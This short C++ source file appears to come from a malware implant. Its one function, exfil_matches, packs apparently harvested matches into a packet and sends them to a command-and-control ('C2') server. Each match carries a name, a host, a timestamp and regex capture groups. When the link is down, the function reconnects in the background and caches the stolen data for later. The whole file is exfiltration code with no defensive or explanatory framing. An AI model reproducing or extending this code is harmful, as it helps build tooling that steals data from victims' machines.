#include "exfil.h"

void exfil_matches(C2 &c2con,std::vector<Match>& mvec, CacheManager& cachemananger)
{
	LOG("exfiltrating matches : " << (uint32_t)mvec.size());
	netpack::Packet p(1);
	p << (uint32_t)mvec.size();
	for (auto m : mvec) {
		p << m.name;
		p << m.host;
		p << m.timestamp;
		p << (uint32_t)m.capturegroups.size();
		for (auto cgroup_match : m.capturegroups) {
			p << cgroup_match;
		}
	}
	
	if (c2con.is_alive()) {
		c2con.send_packet(p);
	}
	else {
		c2con.find_and_connect_async();
		cachemananger.cache(p);
	}

}
